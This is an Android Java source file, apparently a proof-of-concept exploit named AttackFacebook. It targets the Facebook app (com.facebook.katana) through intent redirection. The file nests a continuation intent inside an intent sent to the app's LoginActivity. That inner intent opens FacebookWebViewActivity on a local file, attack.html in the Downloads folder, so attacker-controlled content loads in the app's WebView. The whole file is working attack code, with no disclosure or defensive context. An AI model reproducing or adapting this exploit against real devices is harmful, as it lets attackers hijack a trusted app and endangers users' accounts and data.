package com.fbexploit.app;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.app.Activity;
import android.os.Bundle;

public class AttackFacebook extends Activity {

    // package name of Facebook app
    static final String FB_PKG = "com.facebook.katana";

    // LoginActivity of Facebook app
    static final String FB_LOGIN_ACTIVITY
            = FB_PKG + ".LoginActivity";

    // FacebookWebViewActivity of Facebook app
    static final String FB_WEBVIEW_ACTIVITY
            = FB_PKG + ".view.FacebookWebViewActivity";

    @Override
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        attack();
    }

    // main method
    public void attack() {
        // create continuation_intent to call FacebookWebViewActivity.
        Intent contIntent = new Intent();
        contIntent.setClassName(FB_PKG, FB_WEBVIEW_ACTIVITY);
        // URL pointing to malicious local file.
        // FacebookWebViewActivity will load this URL into its WebView.
        contIntent.putExtra("url", "file:///storage/emulated/0/Download/attack.html");

        // create intent to be sent to LoginActivity.
        Intent intent = new Intent();
        intent.setClassName(FB_PKG, FB_LOGIN_ACTIVITY);
        intent.putExtra("login_redirect", false);

        // put continuation_intent into extra data of the intent.
        intent.putExtra(FB_PKG + ".continuation_intent", contIntent);

        // call LoginActivity
        this.startActivity(intent);
    }
}